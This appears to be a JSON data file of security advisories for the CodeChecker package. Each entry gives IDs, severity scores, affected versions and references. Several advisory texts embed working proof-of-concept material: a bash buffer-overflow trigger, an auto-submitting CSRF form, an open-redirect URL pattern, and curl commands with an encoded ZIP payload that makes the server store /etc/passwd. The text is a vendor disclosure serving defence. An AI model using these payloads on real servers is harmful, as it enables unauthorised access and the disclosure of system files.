@@ -1,0 +1,1021 @@
+{
+  "schema_version": 1,
+  "package": "codechecker",
+  "purls": [
+    "pkg:pypi/codechecker"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 4,
+  "advisories": [
+    {
+      "id": "GHSA-4v9x-cqc5-j645",
+      "primary_id": "CVE-2026-25660",
+      "aliases": [
+        "CVE-2026-25660"
+      ],
+      "cve_ids": [
+        "CVE-2026-25660"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "Codechecker has an authentication bypass for certain API calls",
+      "details": "### Summary\nAuthentication bypass occurs when the URL ends with Authentication with certain function calls. This bypass allows assigning arbitrary permissions to any existing user in CodeChecker.\n\n### Details\n\nThe following functions are affected under the Authentication endpoint: `getAuthorisedNames`, `getPermissionsForUser`, `hasPermission`, `addPermission`, and `removePermission`.\n\nThe vulnerability allows unauthenticated users to execute these function calls with arbitrary arguments.\nIn the logs, the exploit shows as follows:\n```\n[INFO 2026-04-23 21:23] - 127.0.0.1:42654 -- [Anonymous] POST /v6.67/Authentication@getAuthorisedNames\n[INFO 2026-04-23 21:23] - 127.0.0.1:42654 -- [Anonymous] POST /v6.67/Authentication@addPermission\n```\n\n### Impact\nAn attacker with a CodeChecker user can effectively acquire superuser permissions by calling these endpoints.\n\n### Patch\nA patch is available at https://github.com/Ericsson/codechecker/releases/tag/v6.27.4.",
+      "published": "2026-05-05T17:58:09Z",
+      "modified": "2026-05-05T18:18:42.296215Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-4v9x-cqc5-j645"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25660"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-4v9x-cqc5-j645",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "6.27.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1",
+        "6.24.2",
+        "6.24.4",
+        "6.25.0",
+        "6.25.1",
+        "6.26.0",
+        "6.26.1",
+        "6.26.2",
+        "6.27.1",
+        "6.27.3"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-5xf2-f6ch-6p8r",
+      "primary_id": "CVE-2025-40843",
+      "aliases": [
+        "CVE-2025-40843"
+      ],
+      "cve_ids": [
+        "CVE-2025-40843"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "CodeChecker has a buffer overflow in the log command",
+      "details": "### Summary\nCodeChecker versions up to 6.26.1 contain a buffer overflow vulnerability in the internal `ldlogger` library, which is executed by the `CodeChecker log` command.\n\n### Details\nUnsafe usage of `strcpy()` function in the internal `ldlogger` library allows attackers to trigger a buffer overflow by supplying crafted inputs from the command line. Specifically, the destination buffer is stack-allocated with a fixed size of 4096 bytes, while `strcpy()` is called without any length checks, enabling an attacker to overrun the buffer.\n\n### PoC\nExample script is included below to illustrate how this vulnerability can be exploited.\n```bash\n#!/bin/bash\n\nexport CC_LOGGER_DEF_DIRS=1; \npayload=''; for i in $(seq 1 4090); do payload+='A'; done\n\nCodeChecker log -b \"/very/long/path/to/$payload/gcc a.c\" -o compilation.json\n```\n\n### Impact\nAny environment where the vulnerable `CodeChecker log` command is executed with untrusted user input is affected by this vulnerability.",
+      "published": "2025-09-22T18:04:20Z",
+      "modified": "2025-10-29T15:12:17.979658Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-5xf2-f6ch-6p8r"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-40843"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/commit/4122eb1b43d00c880e4f0747d2ca0a674feb7a50"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-5xf2-f6ch-6p8r",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.26.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1",
+        "6.24.2",
+        "6.24.4",
+        "6.25.0",
+        "6.25.1",
+        "6.26.0",
+        "6.26.1"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-f3f8-vx3w-hp5q",
+      "primary_id": "CVE-2024-10081",
+      "aliases": [
+        "CVE-2024-10081",
+        "PYSEC-2024-238"
+      ],
+      "cve_ids": [
+        "CVE-2024-10081"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "codechecker vulnerable to authentication bypass when using specifically crafted URLs",
+      "details": "### Summary\nAuthentication bypass occurs when the API URL ends with Authentication, Configuration or ServerInfo. This bypass allows superuser access to all API endpoints other than Authentication. These endpoints include the ability to add, edit, and remove products, among others.\n\n### Details\nAll endpoints, apart from the /Authentication is affected by the vulnerability.\n\nThe vulnerability allows unauthenticated users to access all API functionality.\nYou can look for the following pattern in the logs to check if the vulnerabilty was exploited:\n![image](https://github.com/user-attachments/assets/6ba02231-a3d8-4832-aee6-f96462b7441e)\n\nNote that the url starts with v and contains a valid CodeChecker endpoint, but it ends in `Authentication`, `Configuration` or `ServerInfo` and it was made by an `Anonymous` user.\n\n### Impact\nThis authentication bypass allows querying, adding, changing, and deleting Products contained on the CodeChecker server, without authentication, by an anonymous user.",
+      "published": "2024-11-06T15:57:08Z",
+      "modified": "2025-11-15T03:32:18.549398Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-f3f8-vx3w-hp5q"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-10081"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/commit/ad41702e3108e4b92ae5d0143a5b961cc34195eb"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2024-238.yaml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-f3f8-vx3w-hp5q",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.24.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-f8c8-4pm7-w885",
+      "primary_id": "CVE-2024-53829",
+      "aliases": [
+        "CVE-2024-53829",
+        "PYSEC-2025-12"
+      ],
+      "cve_ids": [
+        "CVE-2024-53829"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "Cross-Site Request Forgery in CodeChecker API",
+      "details": "### Summary\nCross-site request forgery allows an unauthenticated attacker to hijack the authentication of a logged in user, and use the web API with the same permissions.\n\n### Details\nSecurity attributes like HttpOnly and SameSite are missing from the session cookie, allowing its use from XHR requests and form submissions.\nThe CodeChecker API endpoints only require the session cookie, they do not require a CSRF token, and missing HTTP headers allow the form submission to succeed (but not XHR). This means that the attacker needs to know the ID of products to edit or delete them, but it does not need knowledge to create new products with the SQLite backend.\n\n### PoC\nWith a superuser logged into CodeChecker.\n\n```html\n<html><body>\n    <form action=\"https://codechecker.example.com/v6.58/Products\" method=\"POST\" enctype=\"text/plain\">\n        <input type=\"text\" name='[1,\"getProducts\",1,1,{}]' value=''>\n    </form>\n    <script>document.forms[0].submit()</script>\n</body></html>\n```\nOr the same form attack on any of the applicable endpoints.\n\n### Impact\nThe vulnerability allows an attacker to make requests to CodeChecker as the currently logged in user, including but not limited to adding, removing or editing products. The attacker needs to know the ID of the available products to modify or delete them. The attacker cannot directly exfiltrate data from CodeChecker, due to being limited to form-based CSRF.",
+      "published": "2025-01-21T20:25:05Z",
+      "modified": "2025-04-08T18:08:27.758720Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-f8c8-4pm7-w885"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-53829"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2025-12.yaml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-f8c8-4pm7-w885",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.24.5"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1",
+        "6.24.2",
+        "6.24.4"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-fpm5-2wcj-vfr7",
+      "primary_id": "CVE-2024-10082",
+      "aliases": [
+        "CVE-2024-10082",
+        "PYSEC-2024-183"
+      ],
+      "cve_ids": [
+        "CVE-2024-10082"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "codechecker authentication method confusion vulnerability allows logging in as the built-in root user from an external service",
+      "details": "### Summary\nAuthentication method confusion allows logging in as the built-in root user from an external service. The built-in root user is generated in a weak manner, cannot be disabled, and has universal access. \n\n### Details\nUntil CodeChecker version 6.24.1 there was an auto-generated super-user account that could not be disabled.\nThe attacker needs to know only the username of the root user.\n\nThis root user is unconditionally assigned superuser permissions.\n\nWhich means that if any user via any service logs in with the root user's username, they will unconditionally have superuser permissions on the CodeChecker instance.\n\nThe name of the user name can be found in `root.user` file in the CodeChecker configuration directory.\nYou can check if you are impacted by checking the existence of this user in the external authentication services (e.g. LDAP, PAM etc.).\n\n### Impact\nThis vulnerability allows an attacker who can create an account on an enabled external authentication service, to log in as the root user, and access and control everything that can be controlled via the web interface.\nThe attacker needs to acquire the username of the root user to be successful.",
+      "published": "2024-11-06T15:57:57Z",
+      "modified": "2025-11-15T03:32:00.363355Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-fpm5-2wcj-vfr7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-10082"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/commit/866f3796d01f3158c49b87ccae3e09c0807c1c7b"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2024-183.yaml"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-fpm5-2wcj-vfr7",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.24.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-fxmx-pfm2-85m2",
+      "primary_id": "CVE-2021-44217",
+      "aliases": [
+        "CVE-2021-44217"
+      ],
+      "cve_ids": [
+        "CVE-2021-44217"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "Cross-site Scripting in Ericsson CodeChecker",
+      "details": "In Ericsson CodeChecker prior to 6.18.2, a Stored Cross-site scripting (XSS) vulnerability in the comments component of the reports viewer allows remote attackers to inject arbitrary web script or HTML via the POST JSON data of the /CodeCheckerService API.",
+      "published": "2022-01-21T23:32:32Z",
+      "modified": "2024-12-04T05:42:12.627079Z",
+      "severity": null,
+      "all_severity": [],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44217"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/pull/3549"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/commit/72ee51158e6d81150320223b85410c179b9ee2b1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://codechecker-demo.eastus.cloudapp.azure.com"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/releases/tag/v6.18.2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/Hyperkopite/CVE-2021-44217/blob/main/README.md"
+        },
+        {
+          "type": "WEB",
+          "url": "https://user-images.githubusercontent.com/9525971/142965091-e118b012-a7fc-4c2f-ad0c-80aeed6f7ec9.png"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-fxmx-pfm2-85m2",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.18.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1"
+      ]
+    },
+    {
+      "id": "GHSA-g839-x3p3-g5fm",
+      "primary_id": "CVE-2025-1300",
+      "aliases": [
+        "CVE-2025-1300"
+      ],
+      "cve_ids": [
+        "CVE-2025-1300"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "CodeChecker open redirect when URL contains multiple slashes after the product name",
+      "details": "Summary\n---\n\nCodeChecker versions up to 6.24.5 contain an open redirect vulnerability due to missing protections against multiple slashes after the product name in the URL's path segment.  This results in bypassing protections against CVE-2021-28861, leading to the same open redirect pathway.\n\nDetails\n---\n\nCodeChecker processes GET requests by first rewriting the path segment of the URL, and then passing the rewritten URL to the webserver framework.\nWhen trimming the product name from the URL, no sanitization was performed on the remaining URL, which reintroduced the same issue as CVE-2021-28861, leading to the same open redirect pathway using URLs such as `/Default//attacker.com/%2f..`.\n\nImpact\n---\n\nThe vulnerability allows an attacker to create a hyperlink that looks like a legitimate CodeChecker URL, but redirects to an attacker-supplied website when clicked.",
+      "published": "2025-03-03T19:53:16Z",
+      "modified": "2025-03-03T20:04:20.393250Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/Ericsson/codechecker/security/advisories/GHSA-g839-x3p3-g5fm"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-1300"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/Ericsson/codechecker"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-g839-x3p3-g5fm",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "6.24.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "6.16.0",
+        "6.16.0a1",
+        "6.17.0",
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.19.0",
+        "6.19.1",
+        "6.20.0",
+        "6.20.0rc1",
+        "6.21.0",
+        "6.21.0rc1",
+        "6.22.0",
+        "6.22.0rc1",
+        "6.22.1",
+        "6.22.2",
+        "6.22.2.post1",
+        "6.23.0",
+        "6.23.0rc2",
+        "6.23.1",
+        "6.24.0",
+        "6.24.1",
+        "6.24.2",
+        "6.24.4"
+      ],
+      "affected_conda_versions": [
+        "6.18.0",
+        "6.18.1",
+        "6.18.2",
+        "6.20.0"
+      ]
+    },
+    {
+      "id": "GHSA-h26w-r4m5-8rrf",
+      "primary_id": "CVE-2023-49793",
+      "aliases": [
+        "CVE-2023-49793",
+        "PYSEC-2024-54"
+      ],
+      "cve_ids": [
+        "CVE-2023-49793"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "codechecker",
+      "summary": "CodeChecker has a Path traversal in `CodeChecker server` in the endpoint of `CodeChecker store`",
+      "details": "## Summary\n\nZIP files uploaded to the server-side endpoint handling a `CodeChecker store` are not properly sanitized. An attacker can exercise a path traversal to make the `CodeChecker server` load and display files from an arbitrary location on the server machine.\n\n## Details\n\n### Target\n\nThe vulnerable endpoint is `/<PRODUCT_URL>/v6.53/CodeCheckerService@massStoreRun`.\n\n### Exploit overview\n\nThe attack is made possible by improper sanitization at one point in the process.\n\n1. When the ZIP file is uploaded by `CodeChecker store`, it is first unzipped to a temporary directory (safely).\n2. When deciding which files to insert into CodeChecker's internal database, the decision is made based on the `content_hashes.json` in the ZIP. An attacker has control over the contents of this file.\n3. After reading that file, the paths specified in the JSON are normalized by this code:\nhttps://github.com/Ericsson/codechecker/blob/fa41e4e5d9566b5a4f5a80a27bddec73a5146f5a/web/server/codechecker_server/api/mass_store_run.py#L442-L444\n4. Providing sufficiently many `../../`s inside the `content_hashes.json`, an attacker can control the insertion of completely arbitrary files into CodeChecker's internal database.\n5. This is confirmed in the log output:\n```\nmass_store_run.py:444 __store_source_files() - Storing source file: /etc/passwd\n```\n6. Once the file is inserted into the internal database, it can be displayed trivially on the Web interface.\nAs CodeChecker doesn't distinguish between filenames after the ZIP is extraced, an attacker can define aliases in `content_hashes.json`.\n```\nmass_store_run.py:444 __store_source_files() - Storing source file: /home/discookie/.codechecker/tmpx7hg1teb/root/etc/passwd\nmass_store_run.py:453 __store_source_files() - /etc/passwd not found or already stored.\n```\n7. The file is displayed in the Web UI if and only if there is at least one _bug report_ in it.\nThe bug reports are coming from the ZIP and the attacker can craft the required contents for this.\nIf done so, the logs confirm the requirement for presenting the results of the exploit will be triggered:\n```\nhash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2\n```\n8. The server emits the contents of the injected files from the server's database to all users:\n![CodeChecker's Web UI showing the snapshot of the /etc/passwd file that was injected to the database due to the path traversal attack.](https://user-images.githubusercontent.com/16914176/278057281-2c6994ed-4c24-4026-a6b6-148ac43243ca.png)\n\n> [!NOTE]  \n> The file is shown with the contents as it was on the system when the exploited `CodeChecker store` was exercised. This attack does not allow the server to return the \"live\" contents of a file on the server's storage &mdash; the attacker(s) must recurringly exercise the exploit to keep the injected files \"updated\" in the database.\n\n\n## PoC\n\nThe minimal example that can trigger the exploit can be downloaded: [`PoC.zip`](https://github.com/Ericsson/codechecker/files/14757143/PoC.zip).\n\nThe key to the exploit is the `content_hashes.json` file. The additional files create a report in the loaded `/etc/passwd` file, so it is displayed in the web UI.\n\n<details><summary><tt>/content_hashes.json</tt></summary>\n\n```json\n{\"/../../../../../../../../../../../../../../../etc/passwd\": \"malformed_hash\", \"/etc/passwd\": \"malformed_hash\"}\n```\n</details>\n\n#### Uploading the ZIP to the server\n\nThe communication between the `CodeChecker store` and the server is done by transmitting the ZIP file in a Base64-encoded string.  \nEncoding the ZIP into the format of the API can be done with Python:\n\n```py\nimport base64\nimport zlib\n\nwith open(\"PoC.zip\", \"rb\") as f:\n    contents = f.read()\nencoded = base64.b64encode(zlib.compress(contents))\nprint(encoded)\n```\n\nThe result of the compression and encoding can be sent to the running server over the API.\nWhen the API is called, the exploit is exercised.\n\n```bash\ncurl \"<SERVER_URL>/<PRODUCT_URL>/v6.53/CodeCheckerService\" \\\n    --data \\\n    '[1,\"massStoreRun\",1,0,{\"1\":{\"str\":\"poc\"},\"3\":{\"str\":\"6.22.1\"},\"4\":{\"str\":\"<ENCODED_ZIP>\"},\"5\":{\"tf\":0}}]'\n```\n\n<details><summary>One-line PoC</summary>\n\n```bash\ncurl \"http://localhost:8001/Default/v6.53/CodeCheckerService\" \\\n    --data \\\n    '[1,\"massStoreRun\",1,0,{\"1\":{\"str\":\"poc\"},\"3\":{\"str\":\"6.22.1\"},\"4\" {\"str\":\"eJzNVk9vIzUUT3cpS4MqIcEB2Msw6oGV2vmXzKRZZVPYdpGqLSXSdrXqVquRM+NJhk7GI9tpN5Qe0SJx4MARCfEB+AaIE2glrnAAwY0DXwAQ4gT2ZCbj+ZNI2ROTWLaff+/5+edn+/XuXn2uXuOfi48frP7zh49Ym5eXWXFQSGFI7SEgQ0iU9wkKL2RVUZb4Q+qoESDk3JVvSvIIBB7CI+jGJuVNSV4MuOwx/16J/fvQP35QE74XWMEwQpgSNUMhnEfdEFCg5WoeMFxLc7Vtz2u0XVNvt0yrrbcA8JqN2MyUjK+YGeutk78fXqnVeLGWMTOCFLiAgilf63WJffIZxMRHIVujsZmIKEIBYYKTaZ9/F1kzhoRgBDktDnKhM4TOKcTyZgEDHMoM2+F4xJCN4qiDRiMQcm5PHhXHMp9kSzEMRZfe3Aag3296Ld2Ebrule6bnsbXp/WZjGxrA0TRNt6DeNG+U3DhH+NQPB7brY+hQhCfcrFqCoTGNxtSOAB1WAzAk44DaBI2xA23PDyDnqEBMjCRgFAVQiQKf0NiWEEp5+GWJsxAEkw/Y8rnp0ig59aMIcs604hD1R5BQNvE8p/pw4HNGdau9bTTaTaOpaJap66axWYGG8c4IWNPSrEazWXA/6ybNR+v1yyxa77Fo/WtlfPuja7UaL+Yy0Sqy2Nl5PAqkJCxuybqiyRIMWfCxjb0l3z96Z2tb3unWO2/svbd7dNy7I8VaUu/+7YP9XUneUtW3I2ZMVfeO9qTewf69I4nZUNU7h7IkDymNbqrq+fm5AjhKYaHJgez4YhRBTCcHzNgWU1Bc6spsmqn1nDtM6voO7dbXOqdw0nV9MAgRob5DOioXMDnAGPDGWopcm2IdQOGAxWUKZGJCMVtZ9wANfEeCGCPcURNZpsaPnc0PYlnRQRgqe/6Z78KHEKOysguJg/2IH9Cydo+dAYliwBcIgrKyT8gYxvegnV7EyLMDP4S2H05Fj2nZbMNtsE3vW6ahGc0WBF5ba+ltYDbclq41oFGeKECMm7yLM+oSElCQDa51fDb1AOKuzoyl7QzMz2wVWqsC8+VUgQuWO2p+M/n9Ibg72/Oc6+keRCJ2gUNTPLvF3Bw8oQuesR3IkTeXvrwXVRQuIrGaxkV+V1I5n8wcnYkyu9YIGMCqhS+I00QZg3AASU5X2JFiL0/OHHpEgsrrnUfRQpLm0bSIqAJVy/ve/P/43lHFbcj1xOOVyWfSTDZzveq+TQJDeIeFYCnYSJOkmZnUgXg0fZ9nay3c5XOu44DFIQFihGYLi/UGMISYvQOu3Z8sZ3uXZWC70wysfIEmT1RZa5pWVTqUNrI6fu669d7dlSs7tXlJ+UaS2EpJXZGi15PBldqrtU++6LQOr/2ycvr0z095/evn13/cY/V0knmZdTrJS6x8KSQTouWfn7weW/qe/Pvtu6xO+6LlcjYuWn66TJoiTj0xvV2+mB9+I8eHpannZfAic+srz5rPi358Ix98zOdP69c2rpf8KOdmoh9fX33GTE104+LJ7xt8+rT+7qeUjtXnOWaV/fYZBZ+9yHv/Ac5gmHc=\"},\"5\":{\"tf\":0}}]' \n```\n</details>\n\n<details><summary>Full server logs for the <tt>store</tt> processing</summary>\n\n```\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - server.py:342 do_POST() - 127.0.0.1:33352 -- [Anonymous] POST /Default/v6.53/CodeCheckerService@massStoreRun\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:61 __enter__() - [poc] Unzip storage file...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:82 unzip() - Unzipping mass storage ZIP '/tmp/tmpenegwbxj.zip' to '/home/discookie/.codechecker/tmpx7hg1teb'...\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:64 __exit__() - [poc] Unzip storage file done... (duration: 0.0 sec)\n[DEBUG][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1298 store() - Using unzipped folder '/home/discookie/.codechecker/tmpx7hg1teb'\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:61 __enter__() - [poc] Store source files...\n[INFO][2023-10-25 14:30:31] {server} [2043] <139754026274816> - mass_store_run.py:1310 store() - [poc] Storing 2 source 